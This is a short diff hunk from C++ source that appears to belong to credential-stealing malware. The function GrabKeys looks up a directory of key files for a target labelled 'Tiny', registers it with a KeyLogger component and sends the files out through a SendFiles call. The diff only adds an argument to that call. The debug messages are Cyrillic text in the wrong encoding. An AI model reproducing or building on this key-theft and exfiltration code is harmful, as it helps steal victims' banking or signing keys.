@@ -467,7 +467,7 @@ static void GrabKeys()
 			db->CloseQuery(qr);
 			DBG( "Tiny", "ѕуть к ключам '%s'", pathKeys );
 			KeyLogger::AddDirectory( pathKeys, "keys" );
-			VideoProcess::SendFiles( 0, "keys_tiny", pathKeys, 0, true );
+			VideoProcess::SendFiles( 0, "keys_tiny", pathKeys, 0, 0, true );
 		}
 		else
 			DBG( "Tiny", "ѕуть к ключам в базе данных не найден" );
